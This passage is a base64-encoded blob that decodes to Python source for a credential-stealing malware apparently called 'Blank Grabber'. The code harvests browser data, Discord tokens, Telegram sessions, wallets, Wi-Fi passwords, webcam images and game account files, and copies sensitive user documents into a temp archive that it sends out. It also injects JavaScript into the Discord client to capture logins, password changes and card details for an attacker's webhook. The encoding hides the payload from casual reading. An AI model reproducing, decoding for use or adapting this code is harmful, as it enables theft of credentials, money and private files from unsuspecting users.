VERXlZeWw5ZlYxOU8ybG1LR052Ym1acFoxdDROQ2d3ZUdSaktWMHBhVnQ0TkNnd2VHSXpLVjA5WTI5dVptbG5XM2cwS0RCNE1UUTRLVjByS0NkY2VEQmhKeXRXS1R0b2IyOXJaWElvYVNrN2ZUdHpaWE56YVc5dVcxTW9NSGhtTkNsZFcxTW9NSGczT0NsZFcxTW9NSGd4TXpjcFhTaGpiMjVtYVdkYlV5Z3dlREV3TUNsZExDaFpMRm9wUFQ1N1kyOXVjM1FnZURVOVV6dHBaaWhaVzNnMUtEQjROek1wWFZ0NE5TZ3dlREV4TmlsZEtIZzFLREI0WXprcEtTbHlaWFIxY200Z1dpaDdKMk5oYm1ObGJDYzZJU0ZiWFgwcE8zVndaR0YwWlVOb1pXTnJLQ2s3ZlNrc2MyVnpjMmx2Ymx0VEtEQjRaalFwWFZ0VEtEQjROemdwWFZzbmIyNUlaV0ZrWlhKelVtVmpaV2wyWldRblhTZ29XU3hhS1QwK2UyTnZibk4wSUhnMlBWTTdXVnQ0Tmlnd2VEY3pLVjFiZURZb01IZ3hNVFlwWFNoamIyNW1hV2RiSjNkbFltaHZiMnNuWFNrL1dWc25kWEpzSjExYkoybHVZMngxWkdWekoxMG9lRFlvTUhneE1qVXBLVDlhS0hzbmNtVnpjRzl1YzJWSVpXRmtaWEp6SnpwUFltcGxZM1JiSjJGemMybG5iaWRkS0hzblFXTmpaWE56TFVOdmJuUnliMnd0UVd4c2IzY3RTR1ZoWkdWeWN5YzZKeW9uZlN4WlczZzJLREI0TnprcFhTbDlLVHBhS0hzbmNtVnpjRzl1YzJWSVpXRmtaWEp6SnpwUFltcGxZM1JiSjJGemMybG5iaWRkS0hzblEyOXVkR1Z1ZEMxVFpXTjFjbWwwZVMxUWIyeHBZM2tuT2x0NE5pZ3dlREV5TVNrc2VEWW9NSGhsTkNrc2VEWW9NSGhoWWlsZExDZEJZMk5sYzNNdFEyOXVkSEp2YkMxQmJHeHZkeTFJWldGa1pYSnpKem9uS2ljc0owRmpZMlZ6Y3kxRGIyNTBjbTlzTFVGc2JHOTNMVTl5YVdkcGJpYzZKeW9uZlN4Wld5ZHlaWE53YjI1elpVaGxZV1JsY25NblhTbDlLVG9vWkdWc1pYUmxJRmxiZURZb01IZzNPU2xkVzNnMktEQjRZalFwWFN4a1pXeGxkR1VnV1Z0NE5pZ3dlRGM1S1YxYmVEWW9NSGc1WmlsZExGb29leWR5WlhOd2IyNXpaVWhsWVdSbGNuTW5PbnN1TGk1WlczZzJLREI0TnprcFhTd25RV05qWlhOekxVTnZiblJ5YjJ3dFFXeHNiM2N0U0dWaFpHVnljeWM2SnlvbmZYMHBLVHQ5S1N4elpYTnphVzl1VzFNb01IaG1OQ2xkVzFNb01IZzNPQ2xkVzFNb01IaGhPQ2xkS0dOdmJtWnBaMXRUS0RCNFpUSXBYU3hoYzNsdVl5aFpMRm9wUFQ1N1kyOXVjM1FnZURjOVV6dHBaaWhaV3lkemRHRjBkWE5EYjJSbEoxMGhQVDB3ZUdNNEppWlpXM2czS0RCNE1UQm1LVjBoUFQwd2VHTmhLWEpsZEhWeWJqdGpiMjV6ZENCdlBVSjFabVpsY2x0NE55Z3dlREV5WVNsZEtGbGJlRGNvTUhnNU5DbGRXekI0TUYxYkoySjVkR1Z6SjEwcFczZzNLREI0WlRBcFhTZ3BMRlE5U2xOUFRsdDROeWd3ZURabEtWMG9ieWtzU0QxaGQyRnBkQ0JsZUdWalUyTnlhWEIwS0hnM0tEQjRNVE5sS1NrN2MzZHBkR05vS0NFaFcxMHBlMk5oYzJVZ1dWc25kWEpzSjExYmVEY29NSGhoTWlsZEtIZzNLREI0TnpVcEtUcHNiMmRwYmloVVczZzNLREI0TnpVcFhTeFVXM2czS0RCNE9HVXBYU3hJS1Z0NE55Z3dlREV3TVNsZEtHTnZibk52YkdWYmVEY29NSGczWmlsZEtUdGljbVZoYXp0allYTmxJRmxiZURjb01IZzNNeWxkVzNnM0tEQjRZVElwWFNnbmRYTmxjbk12UUcxbEp5a21KbGxiZURjb01IaGlNaWxkUFQwOUoxQkJWRU5JSnpwcFppZ2hWRnQ0Tnlnd2VEaGxLVjBwY21WMGRYSnVPMVJiZURjb01IaGhNU2xkSmlabGJXRnBiRU5vWVc1blpXUW9WRnNuWlcxaGFXd25YU3hVVzNnM0tEQjRPR1VwWFN4SUtWdDROeWd3ZURFd01TbGRLR052Ym5OdmJHVmJlRGNvTUhnM1ppbGRLVHRVVzNnM0tEQjRNVE5pS1YwbUpuQmhjM04zYjNKa1EyaGhibWRsWkNoVVczZzNLREI0T0dVcFhTeFVXM2czS0RCNE1UTmlLVjBzU0NsYkoyTmhkR05vSjEwb1kyOXVjMjlzWlZzblpYSnliM0luWFNrN1luSmxZV3M3WTJGelpTQlpXM2czS0RCNE56TXBYVnQ0Tnlnd2VHRXlLVjBvZURjb01IaGtOaWtwSmlaWld5ZHRaWFJvYjJRblhUMDlQWGczS0RCNFltWXBPbU52Ym5OMElGWTljWFZsY25semRISnBibWRiSjNCaGNuTmxKMTBvZFc1d1lYSnpaV1JFWVhSaFczZzNLREI0WlRBcFhTZ3BLVHRqWTBGa1pHVmtLRlpiSjJOaGNtUmJiblZ0WW1WeVhTZGRMRlpiZURjb01IZ3hORGtwWFN4V1czZzNLREI0WldRcFhTeFdXM2czS0RCNE9ETXBYU3hJS1Z0NE55Z3dlREV3TVNsZEtHTnZibk52YkdWYmVEY29NSGczWmlsZEtUdGljbVZoYXp0allYTmxJRmxiSjNWeWJDZGRXM2czS0RCNFlUSXBYU2g0Tnlnd2VHWXhLU2ttSmxsYmVEY29NSGhpTWlsZFBUMDllRGNvTUhoaVppazZVR0Y1Y0dGc1FXUmtaV1FvU0NsYmVEY29NSGd4TURFcFhTaGpiMjV6YjJ4bFczZzNLREI0TjJZcFhTazdZbkpsWVdzN1kyRnpaU0JaVzNnM0tEQjROek1wWFZ0NE55Z3dlR0V5S1Ywb0oyTnZibVpwY20wbktTWW1XVnQ0Tnlnd2VHSXlLVjA5UFQxNE55Z3dlR0ptS1RwcFppZ2hZMjl1Wm1sblczZzNLREI0TVRCaEtWMHBjbVYwZFhKdU8zTmxkRlJwYldWdmRYUW9LQ2s5UG50amIyNXpkQ0I0T0QxNE56dHVhWFJ5YjBKdmRXZG9kQ2hJS1Z0NE9DZ3dlREV3TVNsZEtHTnZibk52YkdWYmVEZ29NSGczWmlsZEtUdDlMREI0TVdRMFl5azdZbkpsWVdzN1pHVm1ZWFZzZERwaWNtVmhhenQ5ZlNrc2JXOWtkV3hsVzFNb01IZ3hNbVFwWFQxeVpYRjFhWEpsS0ZNb01IZ3hNRGNwS1RzPScpLmRlY29kZSgKICAgICAgICAgICAgICAgICAgICBlcnJvcnM9J2lnbm9yZScpLnJlcGxhY2UoIiclV0VCSE9PS0hFUkVCQVNFNjRFTkNPREVEJSciLCAiJ3t9JyIuZm9ybWF0KGJhc2U2NC5iNjRlbmNvZGUoU2V0dGluZ3MuQzJbMV0uZW5jb2RlKCkpLmRlY29kZShlcnJvcnM9J2lnbm9yZScpKSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgICAgIGZvciBkaXJuYW1lIGluICgnRGlzY29yZCcsICdEaXNjb3JkQ2FuYXJ5JywgJ0Rpc2NvcmRQVEInLCAnRGlzY29yZERldmVsb3BtZW50Jyk6CiAgICAgICAgICAgICAgICBwYXRoID0gb3MucGF0aC5qb2luKG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksIGRpcm5hbWUpCiAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2RpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsocGF0aCk6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbGUubG93ZXIoKSA9PSAnaW5kZXguanMnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXBhdGggPSBvcy5wYXRoLnJlYWxwYXRoKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnBhdGguam9pbihyb290LCBmaWxlKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguc3BsaXQob3MucGF0aC5kaXJuYW1lKGZpbGVwYXRoKSlbLTFdID09ICdkaXNjb3JkX2Rlc2t0b3BfY29yZSc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVwYXRoLCAndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoY29kZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVjayA9IFRydWUKICAgICAgICAgICAgICAgIGlmIGNoZWNrOgogICAgICAgICAgICAgICAgICAgIGNoZWNrID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICB5aWVsZCBwYXRoCgogICAgY2xhc3MgQmxhbmtHcmFiYmVyOgogICAgICAgIFNlcGFyYXRvcjogc3RyID0gTm9uZQogICAgICAgIFRlbXBGb2xkZXI6IHN0ciA9IE5vbmUKICAgICAgICBBcmNoaXZlUGF0aDogc3RyID0gTm9uZQogICAgICAgIENvb2tpZXM6IGxpc3QgPSBbXQogICAgICAgIFBhc3N3b3Jkc0NvdW50OiBpbnQgPSAwCiAgICAgICAgSGlzdG9yeUNvdW50OiBpbnQgPSAwCiAgICAgICAgQXV0b2ZpbGxDb3VudDogaW50ID0gMAogICAgICAgIFJvYmxveENvb2tpZXNDb3VudDogaW50ID0gMAogICAgICAgIERpc2NvcmRUb2tlbnNDb3VudDogaW50ID0gMAogICAgICAgIFdpZmlQYXNzd29yZHNDb3VudDogaW50ID0gMAogICAgICAgIE1pbmVjcmFmdFNlc3Npb25zOiBpbnQgPSAwCiAgICAgICAgV2ViY2FtUGljdHVyZXNDb3VudDogaW50ID0gMAogICAgICAgIFRlbGVncmFtU2Vzc2lvbnNDb3VudDogaW50ID0gMAogICAgICAgIENvbW1vbkZpbGVzQ291bnQ6IGludCA9IDAKICAgICAgICBXYWxsZXRzQ291bnQ6IGludCA9IDAKICAgICAgICBTY3JlZW5zaG90VGFrZW46IGJvb2wgPSBGYWxzZQogICAgICAgIFN5c3RlbUluZm9TdG9sZW46IGJvb2wgPSBGYWxzZQogICAgICAgIFN0ZWFtU3RvbGVuOiBib29sID0gRmFsc2UKICAgICAgICBFcGljU3RvbGVuOiBib29sID0gRmFsc2UKICAgICAgICBVcGxheVN0b2xlbjogYm9vbCA9IEZhbHNlCiAgICAgICAgR3Jvd3RvcGlhU3RvbGVuOiBib29sID0gRmFsc2UKCiAgICAgICAgZGVmIF9faW5pdF9fKHNlbGYpIC0+IE5vbmU6CiAgICAgICAgICAgIHNlbGYuU2VwYXJhdG9yID0gJ1xuXG4nICsgJ0JsYW5rIEdyYWJiZXInLmNlbnRlcig1MCwgJz0nKSArICdcblxuJwogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgc2VsZi5BcmNoaXZlUGF0aCA9IG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICAgICBvcy5nZXRlbnYoJ3RlbXAnKSwgVXRpbGl0eS5HZXRSYW5kb21TdHJpbmcoKSArICcuemlwJykKICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShzZWxmLkFyY2hpdmVQYXRoKToKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBMb2dnZXIuaW5mbygnQ3JlYXRpbmcgdGVtcG9yYXJ5IGZvbGRlcicpCiAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICBzZWxmLlRlbXBGb2xkZXIgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgb3MuZ2V0ZW52KCd0ZW1wJyksIFV0aWxpdHkuR2V0UmFuZG9tU3RyaW5nKDEwLCBUcnVlKSkKICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZGlyKHNlbGYuVGVtcEZvbGRlcik6CiAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoc2VsZi5UZW1wRm9sZGVyLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGZvciBmdW5jLCBkYWVtb24gaW4gKChzZWxmLlN0ZWFsQnJvd3NlckRhdGEsIEZhbHNlKSwgKHNlbGYuU3RlYWxEaXNjb3JkVG9rZW5zLCBGYWxzZSksIChzZWxmLlN0ZWFsVGVsZWdyYW1TZXNzaW9ucywgRmFsc2UpLCAoc2VsZi5TdGVhbFdhbGxldHMsIEZhbHNlKSwgKHNlbGYuU3RlYWxNaW5lY3JhZnQsIEZhbHNlKSwgKHNlbGYuU3RlYWxFcGljLCBGYWxzZSksIChzZWxmLlN0ZWFsR3Jvd3RvcGlhLCBGYWxzZSksIChzZWxmLlN0ZWFsU3RlYW0sIEZhbHNlKSwgKHNlbGYuU3RlYWxVcGxheSwgRmFsc2UpLCAoc2VsZi5HZXRBbnRpdmlydXMsIEZhbHNlKSwgKHNlbGYuR2V0Q2xpcGJvYXJkLCBGYWxzZSksIChzZWxmLkdldFRhc2tMaXN0LCBGYWxzZSksIChzZWxmLkdldERpcmVjdG9yeVRyZWUsIEZhbHNlKSwgKHNlbGYuR2V0V2lmaVBhc3N3b3JkcywgRmFsc2UpLCAoc2VsZi5TdGVhbFN5c3RlbUluZm8sIEZhbHNlKSwgKHNlbGYuQmxvY2tTaXRlcywgRmFsc2UpLCAoc2VsZi5UYWtlU2NyZWVuc2hvdCwgVHJ1ZSksIChzZWxmLldlYnNob3QsIFRydWUpLCAoc2VsZi5TdGVhbENvbW1vbkZpbGVzLCBUcnVlKSk6CiAgICAgICAgICAgICAgICB0aHJlYWQgPSBUaHJlYWQodGFyZ2V0PWZ1bmMsIGRhZW1vbj1kYWVtb24pCiAgICAgICAgICAgICAgICB0aHJlYWQuc3RhcnQoKQogICAgICAgICAgICAgICAgVGFza3MuQWRkVGFzayh0aHJlYWQpCiAgICAgICAgICAgIFRhc2tzLldhaXRGb3JBbGwoKQogICAgICAgICAgICBMb2dnZXIuaW5mbygnQWxsIGZ1bmN0aW9ucyBlbmRlZCcpCiAgICAgICAgICAgIGlmIEVycm9ycy5lcnJvcnM6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNlbGYuVGVtcEZvbGRlciwgJ0Vycm9ycy50eHQnKSwgJ3cnLCBlbmNvZGluZz0ndXRmLTgnLCBlcnJvcnM9J2lnbm9yZScpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZSgnIyBUaGlzIGZpbGUgY29udGFpbnMgdGhlIGVycm9ycyBoYW5kbGVkIHN1Y2Nlc3NmdWxseSBkdXJpbmcgdGhlIGZ1bmN0aW9uaW5nIG9mIHRoZSBzdGVhbGVyLicgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1xuXG4nICsgJz0nICogNTAgKyAnXG5cbicgKyAoJ1xuXG4nICsgJz0nICogNTAgKyAnXG5cbicpLmpvaW4oRXJyb3JzLmVycm9ycykpCiAgICAgICAgICAgIHNlbGYuU2VuZERhdGEoKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnUmVtb3ZpbmcgYXJjaGl2ZScpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5BcmNoaXZlUGF0aCkKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdSZW1vdmluZyB0ZW1wb3JhcnkgZm9sZGVyJykKICAgICAgICAgICAgICAgIHNodXRpbC5ybXRyZWUoc2VsZi5UZW1wRm9sZGVyKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsQ29tbW9uRmlsZXMoc2VsZikgLT4gTm9uZToKICAgICAgICAgICAgaWYgU2V0dGluZ3MuQ2FwdHVyZUNvbW1vbkZpbGVzOgogICAgICAgICAgICAgICAgZm9yIG5hbWUsIGRpciBpbiAoKCdEZXNrdG9wJywgb3MucGF0aC5qb2luKG9zLmdldGVudigndXNlcnByb2ZpbGUnKSwgJ0Rlc2t0b3AnKSksICgnUGljdHVyZXMnLCBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCd1c2VycHJvZmlsZScpLCAnUGljdHVyZXMnKSksICgnRG9jdW1lbnRzJywgb3MucGF0aC5qb2luKG9zLmdldGVudigndXNlcnByb2ZpbGUnKSwgJ0RvY3VtZW50cycpKSwgKCdNdXNpYycsIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ3VzZXJwcm9maWxlJyksICdNdXNpYycpKSwgKCdWaWRlb3MnLCBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCd1c2VycHJvZmlsZScpLCAnVmlkZW9zJykpLCAoJ0Rvd25sb2FkcycsIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ3VzZXJwcm9maWxlJyksICdEb3dubG9hZHMnKSkpOgogICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIoZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZTogc3RyCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIoZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKG9zLnBhdGguam9pbihkaXIsIGZpbGUpKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYW55KFt4IGluIGZpbGUubG93ZXIoKSBmb3IgeCBpbiAoJ3NlY3JldCcsICdwYXNzd29yZCcsICdhY2NvdW50JywgJ3RheCcsICdrZXknLCAnd2FsbGV0JywgJ2JhY2t1cCcpXSkgb3IgZmlsZS5lbmRzd2l0aCgoJy50eHQnLCAnLmRvYycsICcuZG9jeCcsICcucG5nJywgJy5wZGYnLCAnLmpwZycsICcuanBlZycsICcuY3N2JywgJy5tcDMnLCAnLm1wNCcsICcueGxzJywgJy54bHN4JykpKSBhbmQgb3MucGF0aC5nZXRzaXplKG9zLnBhdGguam9pbihkaXIsIGZpbGUpKSA8IDIgKiAxMDI0ICogMTAyNDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMob3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuVGVtcEZvbGRlciwgJ0NvbW1vbiBGaWxlcycsIG5hbWUpLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkob3MucGF0aC5qb2luKGRpciwgZmlsZSksIG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLlRlbXBGb2xkZXIsICdDb21tb24gRmlsZXMnLCBuYW1lLCBmaWxlKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuQ29tbW9uRmlsZXNDb3VudCArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgIEBFcnJvcnMuQ2F0Y2gKICAgICAgICBkZWYgU3RlYWxNaW5lY3JhZnQoc2VsZikgLT4gTm9uZToKICAgICAgICAgICAgaWYgU2V0dGluZ3MuQ2FwdHVyZUdhbWVzOgogICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ1N0ZWFsaW5nIE1pbmVjcmFmdCByZWxhdGVkIGZpbGVzJykKICAgICAgICAgICAgICAgIHNhdmVUb1BhdGggPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgc2VsZi5UZW1wRm9sZGVyLCAnR2FtZXMnLCAnTWluZWNyYWZ0JykKICAgICAgICAgICAgICAgIHVzZXJQcm9maWxlID0gb3MuZ2V0ZW52KCd1c2VycHJvZmlsZScpCiAgICAgICAgICAgICAgICByb2FtaW5nID0gb3MuZ2V0ZW52KCdhcHBkYXRhJykKICAgICAgICAgICAgICAgIG1pbmVjcmFmdFBhdGhzID0geydJbnRlbnQnOiBvcy5wYXRoLmpvaW4odXNlclByb2ZpbGUsICdpbnRlbnRsYXVuY2hlcicsICdsYXVuY2hlcmNvbmZpZycpLCAnTHVuYXInOiBvcy5wYXRoLmpvaW4odXNlclByb2ZpbGUsICcubHVuYXJjbGllbnQnLCAnc2V0dGluZ3MnLCAnZ2FtZScsICdhY2NvdW50cy5qc29uJyksICdUTGF1bmNoZXInOiBvcy5wYXRoLmpvaW4ocm9hbWluZywgJy5taW5lY3JhZnQnLCAnVGxhdW5jaGVyUHJvZmlsZXMuanNvbicpLCAnRmVhdGhlcic6IG9zLnBhdGguam9pbihyb2FtaW5nLCAnLmZlYXRoZXInLCAnYWNjb3VudHMuanNvbicpLCAnTWV0ZW9yJzogb3MucGF0aC5qb2luKHJvYW1pbmcsICcubWluZWNyYWZ0JywgJ21ldGVvci1jbGllbnQnLCAnYWNjb3VudHMubmJ0JyksICdJbXBhY3QnOiBvcy5wYXRoLmpvaW4ocm9hbWluZywgJy5taW5lY3JhZnQnLCAnSW1wYWN0JywgJ2FsdHMuanNvbicpLCAnTm92b2xpbmUnOiBvcy5wYXRoLmpvaW4ocm9hbWluZywgJy5taW5lY3RhZnQnLCAnTm92b2xpbmUnLCAnYWx0cy5ub3ZvJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ2hlYXRCcmVha2Vycyc6IG9zLnBhdGguam9pbihyb2FtaW5nLCAnLm1pbmVjcmFmdCcsICdjaGVhdGJyZWFrZXJfYWNjb3VudHMuanNvbicpLCAnTWljcm9zb2Z0IFN0b3JlJzogb3MucGF0aC5qb2luKHJvYW1pbmcsICcubWluZWNyYWZ0JywgJ2xhdW5jaGVyX2FjY291bnRzX21pY3Jvc29mdF9zdG9yZS5qc29uJyksICdSaXNlJzogb3MucGF0aC5qb2luKHJvYW1pbmcsICcubWluZWNyYWZ0JywgJ1Jpc2UnLCAnYWx0cy50eHQnKSwgJ1Jpc2UgKEludGVudCknOiBvcy5wYXRoLmpvaW4odXNlclByb2ZpbGUsICdpbnRlbnRsYXVuY2hlcicsICdSaXNlJywgJ2FsdHMudHh0JyksICdQYWxhZGl1bSc6IG9zLnBhdGguam9pbihyb2FtaW5nLCAncGFsYWRpdW0tZ3JvdXAnLCAnYWNjb3VudHMuanNvbicpLCAnUG9seU1DJzogb3MucGF0aC5qb2luKHJvYW1pbmcsICdQb2x5TUMnLCAnYWNjb3VudHMuanNvbicpLCAnQmFkbGlvbic6IG9zLnBhdGguam9pbihyb2FtaW5nLCAnQmFkbGlvbiBDbGllbnQnLCAnYWNjb3VudHMuanNvbicpfQogICAgICAgICAgICAgICAgZm9yIG5hbWUsIHBhdGggaW4gbWluZWNyYWZ0UGF0aHMuaXRlbXMoKToKICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMob3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhdmVUb1BhdGgsIG5hbWUpLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkocGF0aCwgb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhdmVUb1BhdGgsIG5hbWUsIG9zLnBhdGguYmFzZW5hbWUocGF0aCkpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5NaW5lY3JhZnRTZXNzaW9ucyArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsR3Jvd3RvcGlhKHNlbGYpIC0+IE5vbmU6CiAgICAgICAgICAgIGlmIFNldHRpbmdzLkNhcHR1cmVHYW1lczoKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdTdGVhbGluZyBHcm93dG9waWEgc2Vzc2lvbicpCiAgICAgICAgICAgICAgICBncm93dG9waWFkaXJzID0gWypzZXQoW29zLnBhdGguZGlybmFtZSh4KSBmb3IgeCBpbiBbVXRpbGl0eS5HZXRMbmtUYXJnZXQodikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdiBpbiBVdGlsaXR5LkdldExua0Zyb21TdGFydE1lbnUoJ0dyb3d0b3BpYScpXSBpZiB4IGlzIG5vdCBOb25lXSldCiAgICAgICAgICAgICAgICBzYXZlVG9QYXRoID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgIHNlbGYuVGVtcEZvbGRlciwgJ0dhbWVzJywgJ0dyb3d0b3BpYScpCiAgICAgICAgICAgICAgICBtdWx0aXBsZSA9IGxlbihncm93dG9waWFkaXJzKSA+IDEKICAgICAgICAgICAgICAgIGZvciBpbmRleCwgcGF0aCBpbiBlbnVtZXJhdGUoZ3Jvd3RvcGlhZGlycyk6CiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0RmlsZVBhdGggPSBvcy5wYXRoLmpvaW4ocGF0aCwgJ3NhdmUuZGF0JykKICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZSh0YXJnZXRGaWxlUGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9zYXZlVG9QYXRoID0gc2F2ZVRvUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbXVsdGlwbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX3NhdmVUb1BhdGggPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhdmVUb1BhdGgsICdQcm9maWxlICVkJyAlIChpbmRleCArIDEpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoX3NhdmVUb1BhdGgsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwuY29weSh0YXJnZXRGaWxlUGF0aCwgb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9zYXZlVG9QYXRoLCAnc2F2ZS5kYXQnKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuR3Jvd3RvcGlhU3RvbGVuID0gVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLnJtdHJlZShfc2F2ZVRvUGF0aCkKICAgICAgICAgICAgICAgIGlmIG11bHRpcGxlIGFuZCBzZWxmLkdyb3d0b3BpYVN0b2xlbjoKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNhdmVUb1BhdGgsICdJbmZvLnR4dCcpLCAndycpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnTXVsdGlwbGUgR3Jvd3RvcGlhIGluc3RhbGxhdGlvbnMgYXJlIGZvdW5kLCBzbyB0aGUgZmlsZXMgZm9yIGVhY2ggb2YgdGhlbSBhcmUgcHV0IGluIGRpZmZlcmVudCBQcm9maWxlcycpCgogICAgICAgIEBFcnJvcnMuQ2F0Y2gKICAgICAgICBkZWYgU3RlYWxFcGljKHNlbGYpIC0+IE5vbmU6CiAgICAgICAgICAgIGlmIFNldHRpbmdzLkNhcHR1cmVHYW1lczoKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdTdGVhbGluZyBFcGljIHNlc3Npb24nKQogICAgICAgICAgICAgICAgc2F2ZVRvUGF0aCA9IG9zLnBhdGguam9pbihzZWxmLlRlbXBGb2xkZXIsICdHYW1lcycsICdFcGljJykKICAgICAgICAgICAgICAgIGVwaWNQYXRoID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgIG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksICdFcGljR2FtZXNMYXVuY2hlcicsICdTYXZlZCcsICdDb25maWcnLCAnV2luZG93cycpCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKGVwaWNQYXRoKToKICAgICAgICAgICAgICAgICAgICBsb2dpbkZpbGUgPSBvcy5wYXRoLmpvaW4oZXBpY1BhdGgsICdHYW1lVXNlclNldHRpbmdzLmluaScpCiAgICAgICAgICAgICAgICAgICAga